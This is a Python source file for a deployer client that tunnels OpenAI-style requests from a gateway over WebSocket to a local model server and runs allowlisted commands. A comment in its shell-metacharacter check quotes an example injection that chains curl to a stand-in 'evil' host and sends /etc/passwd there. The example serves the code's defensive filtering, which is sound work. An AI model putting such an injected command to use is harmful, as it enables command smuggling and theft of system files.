"""Outbound WebSocket client: register a local OpenAI server with Cortex."""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import shlex
import signal
from collections.abc import Awaitable, Callable

import httpx
import websockets

from .protocol import (
    b64d,
    b64e,
    chunk_frame,
    end_frame,
    hello_frame,
    request_wants_stream,
    response_frame,
    start_frame,
)
from .recycle import (
    RecycleState,
    cooldown_seconds,
    min_hits,
    parse_metrics,
    poll_seconds,
    recycle_cmd_from_env,
    run_recycle_cmd,
    should_recycle,
)

log = logging.getLogger("cortex-deployer")

# read=None: 256K prefills and long thinking turns exceed any idle-read
# budget; the gateway sends kind=cancel when the consumer is gone.
UPSTREAM_TIMEOUT = httpx.Timeout(connect=10.0, read=None, write=600.0, pool=10.0)
DEFAULT_CONCURRENCY = 2

SendFn = Callable[[dict], Awaitable[None]]

# CTX-717 / PLAT-6302: model-serving command allowlist for the exec channel.
# Defense in depth — the gateway also gates on this, but the host is the one
# that actually executes, so it re-checks before spawning anything.
EXEC_ALLOWLIST = tuple(
    os.environ.get("DEPLOYER_EXEC_ALLOWLIST", "mlx_lm.server,mtplx,vllm,health").split(",")
)

# reika PLAT-999 P1: reject shell metacharacters so a crafted command like
# "mlx_lm.server && curl evil/$(cat /etc/passwd)" cannot smuggle arbitrary
# commands past the leading-token allowlist. The host runs argv (no shell) via
# create_subprocess_exec — this gate is defense in depth.
_SHELL_METACHARS = set(";&|$`<>()")


def exec_command_allowed(command: str) -> bool:
    """True when the exec command's binary is on the model-serving allowlist.

    Matches the leading token (e.g. ``mlx_lm.server --port 8080`` →
    ``mlx_lm.server``). Rejects absolute paths, path traversal, shell
    metacharacters, and anything not explicitly allowlisted — never a general
    shell.
    """
    if not command or not command.strip():
        return False
    if any(ch in command for ch in _SHELL_METACHARS):
        return False
    binary = command.strip().split()[0]
    if "/" in binary or "\\" in binary or ".." in binary:
        return False
    return binary in EXEC_ALLOWLIST

# Connect is usually pointed at ``http://127.0.0.1:8014/v1``. Rapid-MLX
# (and llama.cpp) publish Prometheus / health / slots on the *origin root*,
# not under /v1. Cortex probes ``{base_url minus /v1}/metrics``.
_ORIGIN_ROOT_PATHS = frozenset({
    "/metrics",
    "/health",
    "/props",
    "/slots",
})


def join_upstream(upstream: str, path: str) -> str:
    """Join a proxied path onto the configured upstream.

    ``/v1``-suffixed upstreams keep chat/completions under /v1, but
    ``/metrics`` and friends are stripped back to the origin root so the
    Cortex backends page can scrape Rapid-MLX / llama.cpp.
    """
    base = (upstream or "").rstrip("/")
    p = path if str(path).startswith("/") else f"/{path}"
    root = p.split("?", 1)[0].rstrip("/") or "/"
    if root in _ORIGIN_ROOT_PATHS and base.endswith("/v1"):
        base = base[:-3]
    return base + p


def _out_headers(resp: httpx.Response) -> dict[str, str]:
    return {k: v for k, v in resp.headers.items() if k.lower() != "content-length"}


def _rewrite_json_model(body: bytes, name: str) -> bytes:
    """Point an OpenAI body at the single loaded mlx-lm model.

    mlx_lm.server only maps ``default_model``; Cortex sends the catalog
    id (Qwen3.8-27B-MLX). Rewrite so we do not trigger an HF fetch.
    """
    if not name or not body:
        return body
    try:
        obj = json.loads(body)
    except (TypeError, ValueError):
        return body
    if not isinstance(obj, dict) or "model" not in obj:
        return body
    obj["model"] = name
    return json.dumps(obj).encode()


def _inject_advertised_models(body: bytes, names: list[str], ctx: int | None) -> bytes:
    """Ensure Cortex health sees the catalog / served name on /v1/models.

    mlx_lm.server lists the local path (and leftover HF cache repos), never
    ``Qwen3.8-27B-MLX`` / ``qwen3.8-27b``. Health then marks model_absent.
    """
    try:
        obj = json.loads(body or b"")
    except (TypeError, ValueError):
        return body
    if not isinstance(obj, dict):
        return body
    data = obj.get("data")
    if not isinstance(data, list):
        data = []
    have = {m.get("id") for m in data if isinstance(m, dict)}
    extra = []
    for name in names:
        n = str(name or "").strip()
        if not n or n in have:
            continue
        row = {"id": n, "object": "model", "owned_by": "mlx-lm"}
        if ctx:
            row["context_window"] = int(ctx)
            row["max_model_len"] = int(ctx)
        extra.append(row)
        have.add(n)
    if extra:
        obj["data"] = extra + data
    return json.dumps(obj).encode()


async def relay_request(
    client: httpx.AsyncClient,
    upstream: str,
    msg: dict,
    send: SendFn,
) -> None:
    """Forward one proxied request to the local inference server."""
    method = msg.get("method", "GET").upper()
    path = msg.get("path", "/")
    headers = {k: v for k, v in (msg.get("headers") or {}).items()}
    body = b64d(msg.get("body_b64", "")) if msg.get("body_b64") else None
    rid = str(msg.get("id") or "")

    rewrite = (
        str(msg.get("rewrite_model") or "").strip()
        or os.environ.get("CORTEX_DEPLOYER_REWRITE_MODEL", "").strip()
    )
    if rewrite and body and method in {"POST", "PUT", "PATCH"}:
        body = _rewrite_json_model(body, rewrite)
    url = join_upstream(upstream, path)
    key = os.environ.get("CORTEX_DEPLOYER_UPSTREAM_KEY") or os.environ.get("DEPLOYER_UPSTREAM_KEY") or ""
    if key and not any(k.lower() == "authorization" for k in headers):
        headers["authorization"] = "Bearer " + key
    log.info("relay %s %s (%d bytes)", method, url, len(body or b""))
    try:
        async with client.stream(method, url, content=body, headers=headers) as resp:
            out_headers = _out_headers(resp)
            content_type = (resp.headers.get("content-type") or "").lower()
            is_sse = "text/event-stream" in content_type
            if resp.status_code == 200 and (request_wants_stream(body) or is_sse):
                await send(start_frame(rid, resp.status_code, out_headers))
                async for chunk in resp.aiter_bytes():
                    if chunk:
                        await send(chunk_frame(rid, chunk))
                await send(end_frame(rid))
                return
            content = await resp.aread()
            status = resp.status_code
            root = path.split("?", 1)[0].rstrip("/") or "/"
            if method == "GET" and root == "/metrics" and status == 404:
                # mlx-lm has no Prometheus. Cortex treats /metrics 404 as
                # unhealthy and 503s the catalog even though /v1/models is 200.
                status = 200
                out_headers = {"content-type": "text/plain; version=0.0.4"}
                content = b"# cortex-deployer: upstream has no /metrics\n"
            if method == "GET" and root in {"/models", "/v1/models"} and status == 200:
                ads = msg.get("advertise_models") or []
                ctx = msg.get("advertise_context")
                if ads:
                    content = _inject_advertised_models(content, ads, ctx)
            await send(response_frame(rid, status, out_headers, content))
    except asyncio.CancelledError:
        log.info("upstream cancelled rid=%s %s %s", rid, method, url)
        raise
    except Exception as exc:  # noqa: BLE001 — report upstream failure to the router
        log.exception("upstream error for %s %s", method, url)
        err = json.dumps({"error": f"deployer upstream error: {exc}"}).encode()
        await send(
            response_frame(rid, 502, {"content-type": "application/json"}, err)
        )


async def exec_command(msg: dict, send: SendFn) -> None:
    """CTX-717 / PLAT-6302: run an allowlisted model-serving command on the
    host and stream stdout/stderr back to the gateway as start/chunk/end.

    The gateway sends ``{id, kind: "exec", command, timeout_s}``. The binary
    must be on EXEC_ALLOWLIST (re-checked here, defense in depth). Output is
    streamed line/chunk-wise so a long-running engine command (e.g. an
    ``mlx_lm.server`` health probe or ``mtplx`` A/B run) does not block the
    relay loop.
    """
    rid = str(msg.get("id") or "")
    command = str(msg.get("command") or "")
    if not exec_command_allowed(command):
        err = json.dumps({"error": "command not on model-serving allowlist"}).encode()
        await send(response_frame(rid, 403, {"content-type": "application/json"}, err))
        return
    try:
        timeout_s = float(msg.get("timeout_s") or 120.0)
    except (TypeError, ValueError):
        timeout_s = 120.0
    log.info("exec rid=%s cmd=%s", rid, command)
    proc: asyncio.subprocess.Process | None = None
    try:
        # reika PLAT-999 P1: never run a shell. Parse into argv and exec the
        # binary directly — shell metacharacters were already rejected by
        # exec_command_allowed, so this is the final no-shell guarantee.
        argv = shlex.split(command)
        if not argv or not exec_command_allowed(command):
            err = json.dumps({"error": "command not on model-serving allowlist"}).encode()
            await send(response_frame(rid, 403, {"content-type": "application/json"}, err))
            return
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        await send(start_frame(rid, 200, {"content-type": "text/plain; charset=utf-8"}))
        assert proc.stdout is not None
        while True:
            chunk = await asyncio.wait_for(proc.stdout.read(8192), timeout=timeout_s)
            if not chunk:
                break
            await send(chunk_frame(rid, chunk))
        await proc.wait()
        await send(end_frame(rid))
    except asyncio.TimeoutError:
        log.warning("exec timeout rid=%s cmd=%s", rid, command)
        if proc is not None:
            proc.kill()
        await send(end_frame(rid))
    except Exception as exc:  # noqa: BLE001
        log.exception("exec error rid=%s", rid)
        err = json.dumps({"error": f"deployer exec error: {exc}"}).encode()
        await send(response_frame(rid, 502, {"content-type": "application/json"}, err))


async def run_once(args: argparse.Namespace) -> None:
    """One connect → register → serve cycle. Raises on disconnect so the caller retries."""
    if not args.token:
        raise SystemExit("connect requires --token or CORTEX_DEPLOYER_TOKEN")
    uri = args.gateway
    sep = "&" if "?" in uri else "?"
    uri = f"{uri}{sep}token={args.token}"

    log.info("connecting to gateway %s (model=%s)", args.gateway, args.model)
    async with websockets.connect(uri, max_size=None, ping_interval=20) as ws:
        hello = hello_frame(
            args.model,
            list(args.alias or []),
            max_model_len=args.max_model_len,
            engine=args.engine,
            quant=args.quant,
            max_concurrent=args.concurrency,
        )
        await ws.send(json.dumps(hello))
        ack = json.loads(await ws.recv())
        if not ack.get("ok"):
            raise RuntimeError(f"gateway rejected registration: {ack}")
        log.info("registered model=%s aliases=%s", args.model, hello["aliases"])

        send_lock = asyncio.Lock()

        async def send(obj: dict) -> None:
            async with send_lock:
                await ws.send(json.dumps(obj))

        sem = asyncio.Semaphore(max(1, int(args.concurrency)))
        inflight: set[asyncio.Task] = set()
        inflight_by_id: dict[str, asyncio.Task] = {}

        async def handle(msg: dict) -> None:
            async with sem:
                extra: dict = {}
                if getattr(args, "rewrite_model", ""):
                    extra["rewrite_model"] = args.rewrite_model
                # Served/upstream name first so Cortex advertised_id matches
                # backend.upstream_name (qwen3.8-27b), not only the catalog id.
                ads = [*(args.alias or []), args.model]
                extra["advertise_models"] = [a for a in ads if a]
                if getattr(args, "max_model_len", None):
                    extra["advertise_context"] = int(args.max_model_len)
                if extra:
                    msg = {**msg, **extra}
                await relay_request(client, args.upstream, msg, send)

        async with httpx.AsyncClient(timeout=UPSTREAM_TIMEOUT) as client:
            try:
                probe = await client.get(args.upstream.rstrip("/") + "/models")
                log.info("upstream /models -> %s", probe.status_code)
            except Exception as exc:  # noqa: BLE001
                log.warning("upstream /models probe failed: %s", exc)

            recycle_task: asyncio.Task | None = None
            recycle_cmd = recycle_cmd_from_env(getattr(args, "recycle_cmd", "") or "")
            if recycle_cmd:
                recycle_task = asyncio.create_task(
                    _recycle_watch(client, args.upstream, recycle_cmd)
                )
                log.info("idle Metal-cap recycle armed cmd=%s", recycle_cmd)

            try:
                async for raw in ws:
                    msg = json.loads(raw)
                    if msg.get("kind") == "cancel":
                        rid = str(msg.get("id") or "")
                        task = inflight_by_id.pop(rid, None)
                        if task is not None:
                            task.cancel()
                            log.info("cancel rid=%s", rid)
                        continue
                    if msg.get("kind") == "exec":
                        # CTX-717 / PLAT-6302: allowlisted model-serving command.
                        rid = str(msg.get("id") or "")
                        task = asyncio.create_task(exec_command(msg, send))
                        inflight.add(task)
                        inflight_by_id[rid] = task

                        def _done(t: asyncio.Task, done_rid: str = rid) -> None:
                            inflight.discard(t)
                            inflight_by_id.pop(done_rid, None)

                        task.add_done_callback(_done)
                        continue
                    if msg.get("kind") in {"response", "start", "chunk", "end", "ok"}:
                        continue
                    if not msg.get("id") or not msg.get("method"):
                        continue
                    rid = str(msg["id"])
                    task = asyncio.create_task(handle(msg))
                    inflight.add(task)
                    inflight_by_id[rid] = task

                    def _done(t: asyncio.Task, done_rid: str = rid) -> None:
                        inflight.discard(t)
                        inflight_by_id.pop(done_rid, None)

                    task.add_done_callback(_done)
            finally:
                if recycle_task is not None:
                    recycle_task.cancel()
                    await asyncio.gather(recycle_task, return_exceptions=True)
                for task in list(inflight):
                    task.cancel()
                if inflight:
                    await asyncio.gather(*inflight, return_exceptions=True)
    log.info("disconnected from gateway")


async def _recycle_watch(client: httpx.AsyncClient, upstream: str, cmd: str) -> None:
    """Poll Rapid-MLX /metrics; recycle the engine only while idle-and-rejecting."""
    state = RecycleState()
    url = join_upstream(upstream, "/metrics")
    interval = poll_seconds()
    needed = min_hits()
    cool = cooldown_seconds()
    while True:
        try:
            resp = await client.get(url)
            snap = parse_metrics(resp.text or "")
            now = asyncio.get_running_loop().time()
            fire, reason = should_recycle(
                snap,
                state,
                now=now,
                min_hits_needed=needed,
                cooldown_s=cool,
            )
            if fire:
                log.warning(
                    "idle D-METAL-CAP wedge (running=%s waiting=%s metal=%.1fGB "
                    "violations=%s); recycling engine via configured cmd",
                    snap.running,
                    snap.waiting,
                    (snap.metal_active or 0) / 1e9,
                    snap.cap_violations,
                )
                code = await asyncio.to_thread(run_recycle_cmd, cmd)
                state.last_recycle_mono = asyncio.get_running_loop().time()
                state.hits = 0
                log.warning("engine recycle cmd exited %s (%s)", code, reason)
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001 — never kill connect over a probe miss
            log.info("recycle watch skipped: %s", exc)
        await asyncio.sleep(interval)


async def main_async(args: argparse.Namespace) -> int:
    backoff = 1
    while True:
        try:
            await run_once(args)
            backoff = 1
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001
            log.warning("connection cycle failed: %s; retry in %ds", exc, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


def add_connect_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--gateway",
        default=os.environ.get("CORTEX_DEPLOYER_GATEWAY")
        or os.environ.get("DEPLOYER_GATEWAY")
        or "",
        help="wss://…/deployer/ws/register (or CORTEX_DEPLOYER_GATEWAY)",
    )
    parser.add_argument(
        "--token",
        default=os.environ.get("CORTEX_DEPLOYER_TOKEN")
        or os.environ.get("DEPLOYER_TOKEN")
        or "",
        help="pairing token from the Cortex UI (required)",
    )
    parser.add_argument(
        "--model",
        default=os.environ.get("CORTEX_DEPLOYER_MODEL")
        or os.environ.get("DEPLOYER_MODEL")
        or "",
        help="catalog model id to register",
    )
    parser.add_argument(
        "--alias",
        action="append",
        default=[],
        help="extra catalog alias (repeatable); model id is always included",
    )
    parser.add_argument(
        "--upstream",
        default=os.environ.get("CORTEX_DEPLOYER_UPSTREAM")
        or os.environ.get("DEPLOYER_UPSTREAM")
        or "http://127.0.0.1:8080/v1",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=int(
            os.environ.get(
                "CORTEX_DEPLOYER_CONCURRENCY",
                os.environ.get("DEPLOYER_CONCURRENCY", str(DEFAULT_CONCURRENCY)),
            )
        ),
    )
    parser.add_argument("--max-model-len", type=int, default=None)
    parser.add_argument("--engine", default="")
    parser.add_argument("--quant", default="")
    parser.add_argument(
        "--recycle-cmd",
        default=os.environ.get("CORTEX_DEPLOYER_RECYCLE_CMD") or "",
        help=(
            "shell command to recycle the local engine when Rapid-MLX is idle "
            "and D-METAL-CAP is rejecting (or CORTEX_DEPLOYER_RECYCLE_CMD). "
            "Never runs while requests_running>0"
        ),
    )
    parser.add_argument(
        "--auto-update",
        action="store_true",
        help="upgrade the deployer package on start (models / run stay up)",
    )
    parser.add_argument(
        "--rewrite-model",
        default=os.environ.get("CORTEX_DEPLOYER_REWRITE_MODEL") or "",
        help=(
            "replace JSON body model= with this name (mlx_lm.server wants "
            "default_model). Or CORTEX_DEPLOYER_REWRITE_MODEL"
        ),
    )


def parse_connect_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Cortex Deployer Client (outbound WS tunnel)",
    )
    add_connect_arguments(parser)
    return parser.parse_args(argv)


parse_args = parse_connect_args


def run_connect(args: argparse.Namespace) -> None:
    if not args.gateway:
        raise SystemExit("connect requires --gateway or CORTEX_DEPLOYER_GATEWAY")
    if not args.model:
        raise SystemExit("connect requires --model")
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s deployer-client %(message)s",
    )
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    def _stop(*_):
        log.info("shutdown signal received")
        for task in asyncio.all_tasks(loop):
            task.cancel()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _stop)
        except NotImplementedError:
            pass

    try:
        loop.run_until_complete(main_async(args))
    except asyncio.CancelledError:
        pass
    finally:
        loop.close()
    log.info("deployer client stopped")


def main(argv: list[str] | None = None) -> None:
    """Entry point compatible with the historical deployer_client.py script."""
    run_connect(parse_connect_args(argv))


if __name__ == "__main__":
    main()
